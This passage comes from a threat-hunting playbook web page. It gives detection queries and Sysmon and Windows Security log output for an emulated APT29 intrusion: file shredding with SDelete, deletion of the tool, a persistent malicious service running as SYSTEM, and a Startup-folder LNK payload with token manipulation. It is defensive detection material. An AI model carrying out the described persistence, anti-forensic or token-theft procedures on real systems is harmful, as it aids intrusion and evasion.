 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:16:52.587
ProcessGuid: {5aa8ec29-e624-5eac-7f03-000000000400}
ProcessId: 3552
User: DMEVALS\pbeesly
Image: C:\Windows\Temp\sdelete64.exe
TargetFilename: C:\Windows\Temp\Rar.exe
Hashes: SHA1=408238F3BEA1DF74E8B9B672E8F95C5BA2C5DBC0,MD5=FD021D31F1DFA5E00EFA035758023064,SHA256=8FD96796FCDB8CAC8DB026C2C78E24493507CEDC500E358B1564F184DA18D94C,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: false - shredded file with pattern 0x00                      
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-4-file-deletion">
<h2>9.C.4. File Deletion<a class="headerlink" href="#c-4-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted SDelete on disk using cmd.exe del command</p>
<p><strong>Criteria:</strong> cmd.exe deleting the file sdelete64.exe</p>
<div class="section" id="id76">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id76" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:0FC62E32-9052-49EB-A5D5-1DF316D634AD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND h.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:17:52.009
ProcessGuid: {5aa8ec29-e618-5eac-7e03-000000000400}
ProcessId: 8772
User: DMEVALS\pbeesly
Image: C:\windows\system32\cmd.exe
TargetFilename: C:\Windows\Temp\sdelete64.exe
Hashes: SHA1=7BCD946326B67F806B3DB4595EDE9FBDF29D0C36,MD5=2B5CB081721B8BA454713119BE062491,SHA256=FEEC1457836A5F84291215A2A003FCDE674E7E422DF8C4ED6FE5BB3B679CDC87,IMPHASH=342934F7499D0F57D88D4434E41B7BF9
IsExecutable: true
Archived: true 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-service-execution">
<h2>10.A.1. Service Execution<a class="headerlink" href="#a-1-service-execution" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed persistent service (javamtsup) on system startup</p>
<p><strong>Criteria:</strong> javamtsup.exe spawning from services.exe</p>
<div class="section" id="id77">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id77" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:CB9F90C0-93EA-469A-9515-7DF27DF1592A</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND EventID = 1</span>
<span class="sd">  AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">  AND Image LIKE &#39;%javamtsup.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:19:14.118
ProcessGuid: {47ab858c-e6b2-5eac-4d00-000000000500}
ProcessId: 3296
Image: C:\Windows\System32\javamtsup.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: C:\Windows\System32\javamtsup.exe
CurrentDirectory: C:\windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {47ab858c-e6ad-5eac-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=FF57080E5B19C3DCF62A00EA4037330F78B228CB,MD5=1B94BED747B7539280C9762C9C1B27EB,SHA256=8BE07818317849B36C2097E799DA9719471BA1D4DD9C60A97E31CA7CEDC6E992,IMPHASH=A6D0283F95584F8785C65A050B4C2A6B
ParentProcessGuid: {47ab858c-e6ad-5eac-0b00-000000000500}
ParentProcessId: 736
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\windows\system32\services.exe 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:4DABE602-E648-4C1E-81B3-A2AC96F94CE0</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 4688</span>
<span class="sd">  AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">  AND NewProcessName LIKE &#39;%javamtsup.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xce0
	New Process Name:	C:\Windows\System32\javamtsup.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\Windows\System32\javamtsup.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id78">
<h2>10.B.1. Registry Run Keys / Startup Folder<a class="headerlink" href="#id78" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed LNK payload (hostui.lnk) in Startup Folder on user login</p>
<p><strong>Criteria:</strong> Evidence that the file hostui.lnk (which executes hostui.bat as a byproduct) was executed from the Startup Folder</p>
<div class="section" id="id79">
<h3>Detection Type:None(None)<a class="headerlink" href="#id79" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-2-execution-through-api">
<h2>10.B.2. Execution through API<a class="headerlink" href="#b-2-execution-through-api" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed PowerShell payload via the CreateProcessWithToken API</p>
<p><strong>Criteria:</strong> hostui.exe executing the CreateProcessWithToken API</p>
<div class="section" id="id80">
<h3>Detection Type:None(None)<a class="headerlink" href="#id80" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-3-access-token-manipulation">
<h2>10.B.3. Access Token Manipulation<a class="headerlink" href="#b-3-access-token-manipulation" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Manipulated the token of the PowerShell payload via the CreateProcessWithToken API</p>
<p><strong>Criteria:</strong> hostui.exe manipulating the token of powershell.exe via the CreateProcessWithToken API OR powershell.exe executing with the stolen token of explorer.exe</p>
<div class="section" id="id81">
<h3>Detection Type:None(None)<a class="headerlink" href="#id81" title="Permalink to this headline">¶</a></h3>
</div>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "OTRF/ThreatHunter-Playbook",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "pyspark3"
        },
        kernelOptions: {
            kernelName: "pyspark3",
            path: "./notebooks/campaigns"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'pyspark3'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="../../evals/apt29/report.html" title="previous page">Free Telemetry Report</a>
    <a class='right-next' id="next-link" href="../windows/intro.html" title="next page">Windows</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Roberto Rodriguez @Cyb3rWard0g<br/>
        
            &copy; Copyright 2020.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    <script src="../../_static/js/index.js"></script>
    
  </body>
</html>